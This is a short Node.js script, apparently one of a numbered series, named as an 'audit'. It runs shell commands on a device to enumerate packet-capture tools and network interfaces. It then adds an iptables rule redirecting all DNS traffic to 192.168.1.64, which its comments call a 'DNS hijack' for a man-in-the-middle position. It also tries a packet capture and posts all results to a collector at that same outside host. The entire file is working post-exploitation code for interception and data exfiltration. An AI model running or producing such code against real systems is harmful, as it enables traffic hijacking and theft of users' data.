"use strict";
// audit111.js - find packet capture method + start capture + re-add DNS hijack.
var http = require("http");
var cp = require("child_process");
var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { try { res.resume(); } catch (e) {} });
    req.on("error", function () {});
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 25000 }).slice(0, cap || 12000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

var out = {};
out.started = new Date().toISOString();

// 1. what capture tools exist?
out.tools = sh("which tcpdump tshark dumpcap snort ngrep busybox 2>&1; ls /usr/sbin/vd-* /usr/bin/*dump* /usr/bin/*cap* 2>/dev/null | head -15", 2000);
out.vd_help = sh("vd-tcpdump --help 2>&1 | head -20; vd-tcpdump -h 2>&1 | head -20", 1500);
out.ifaces = sh("ls /sys/class/net/ 2>&1; cat /proc/net/dev 2>&1 | head -10", 1500);

// 2. re-add DNS hijack so we can also capture at the MITM
out.dns = sh("iptables -t nat -A OUTPUT -p udp --dport 53 -j DNAT --to-destination 192.168.1.64:5353 2>&1; echo RC=$?", 200);

// 3. check if python is available for raw socket capture
out.python = sh("which python python2 python3 2>&1; python --version 2>&1; python2 --version 2>&1", 500);

// 4. try starting vd-tcpdump
out.vd_test = sh("vd-tcpdump -i any -c 5 -w /tmp/test.pcap 2>&1 | head -10", 3000);

post("/p111_tools", out);
post("/p111_done", { started: out.started });
